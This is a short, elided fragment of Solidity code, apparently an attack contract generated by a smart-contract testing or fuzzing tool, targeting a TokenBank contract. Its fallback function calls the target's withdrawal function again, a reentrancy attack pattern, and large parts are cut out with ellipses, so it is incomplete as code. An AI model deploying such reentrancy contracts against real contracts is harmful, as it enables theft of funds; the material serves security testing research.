...
import "/home/hjwang/Tools/ContraMaster/contracts/TokenBank.sol";

contract Attack_TokenBank3 {

  TokenBank public target_contract;

  function Attack_TokenBank3(address _targetContract) public payable {
  ...
  function vultron_WithdrawToHolder(uint256 vultron_amount, address _addr, uint256 _wei) public payable{
    target_contract.WithdrawToHolder.value(vultron_amount)(_addr, _wei);
      ...
      function() public payable {
        ...
        target_contract.WitdrawTokenToHolder(this,  this, 1000);
      }
      } 
